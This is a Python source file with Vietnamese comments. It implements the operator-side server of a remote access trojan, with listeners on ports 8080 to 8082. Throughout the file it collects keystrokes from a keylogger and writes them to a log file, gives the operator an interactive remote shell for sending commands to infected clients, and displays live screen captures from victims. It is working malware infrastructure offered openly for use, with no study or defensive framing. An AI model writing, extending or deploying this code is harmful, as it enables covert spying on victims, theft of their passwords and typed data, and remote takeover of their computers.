import socket
import threading
import cv2
import numpy as np
import os

# ==========================================
# CẤU HÌNH SERVER
# ==========================================
HOST = '0.0.0.0'       # Lắng nghe trên tất cả các card mạng của máy server
SHELL_PORT = 8080      # Cổng nhận Remote Shell
LOG_PORT = 8081        # Cổng nhận Keylogger
SCREEN_PORT = 8082     # Cổng nhận Screen Stream

# Tạo thư mục lưu log phím gõ nếu chưa có
if not os.path.exists("logs"):
    os.makedirs("logs")

# ==========================================
# 1. XỬ LÝ KẾT NỐI KEYLOGGER (NHẬN & LƯU LOG)
# ==========================================
def handle_keylogger():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, LOG_PORT))
    server.listen(5)
    print(f"[*] Keylogger Server đang lắng nghe tại cổng {LOG_PORT}...")

    while True:
        try:
            conn, addr = server.accept()
            data = conn.recv(4096).decode('utf-8', errors='ignore')
            if data:
                print(f"\n[KEYLOGGER từ {addr[0]}]:\n{data}")
                with open("logs/key_logs.txt", "a", encoding="utf-8") as f:
                    f.write(data)
            conn.close()
        except Exception as e:
            print(f"[-] Lỗi ở Keylogger Server: {e}")

# ==========================================
# 2. XỬ LÝ KẾT NỐI REMOTE SHELL (ĐIỀU KHIỂN CMD)
# ==========================================
def handle_shell():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, SHELL_PORT))
    server.listen(5)
    print(f"[*] Remote Shell Server đang lắng nghe tại cổng {SHELL_PORT}...")

    while True:
        try:
            conn, addr = server.accept()
            print(f"\n[+] Đã có Client kết nối Shell từ: {addr[0]}")
            
            while True:
                command = input("Shell> ")
                if not command.strip():
                    continue
                
                conn.send(command.encode('utf-8'))
                if command.lower() == "exit":
                    break

                # Nhận kết quả trả về (đọc theo dạng buffer lớn)
                output = conn.recv(65536).decode('utf-8', errors='ignore')
                print(output)
                
            conn.close()
        except Exception as e:
            print(f"[-] Mất kết nối Shell hoặc lỗi: {e}")
            break

# ==========================================
# 3. XỬ LÝ KẾT NỐI SCREEN STREAM (XEM MÀN HÌNH)
# ==========================================
def handle_screen():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, SCREEN_PORT))
    server.listen(5)
    print(f"[*] Screen Stream Server đang lắng nghe tại cổng {SCREEN_PORT}...")

    while True:
        try:
            conn, addr = server.accept()
            print(f"\n[+] Đã kết nối màn hình từ Client: {addr[0]}")
            
            data = b""
            payload_size = 4

            while True:
                # Nhận đủ kích thước khung hình (4 bytes)
                while len(data) < payload_size:
                    packet = conn.recv(4096)
                    if not packet:
                        break
                    data += packet
                
                if len(data) < payload_size:
                    break

                packed_msg_size = data[:payload_size]
                data = data[payload_size:]
                msg_size = int.from_bytes(packed_msg_size, byteorder='big')

                # Nhận đủ dữ liệu ảnh JPEG theo đúng kích thước
                while len(data) < msg_size:
                    packet = conn.recv(4096)
                    if not packet:
                        break
                    data += packet
                
                if len(data) < msg_size:
                    break

                frame_data = data[:msg_size]
                data = data[msg_size:]

                # Chuyển đổi dữ liệu byte thành hình ảnh hiển thị qua OpenCV
                frame = np.frombuffer(frame_data, dtype=np.uint8)
                img = cv2.imdecode(frame, cv2.IMREAD_COLOR)

                if img is not None:
                    cv2.imshow(f"Screen Stream - {addr[0]}", img)
                
                # Bấm phím 'q' trên cửa sổ hình ảnh để thoát
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    break

            conn.close()
            cv2.destroyAllWindows()
        except Exception as e:
            print(f"[-] Lỗi Screen Stream: {e}")
            cv2.destroyAllWindows()

# ==========================================
# HÀM KHỞI CHẠY CHÍNH SERVER (ĐA LUỒNG)
# ==========================================
if __name__ == "__main__":
    print("[*] Đang khởi động toàn bộ Server quản lý...")

    # Khởi chạy 3 tiến trình độc lập bằng Thread
    threading.Thread(target=handle_keylogger, daemon=True).start()
    threading.Thread(target=handle_screen, daemon=True).start()
    
    # Chạy Shell ở luồng chính để bạn có thể gõ lệnh tương tác trực tiếp
    handle_shell()
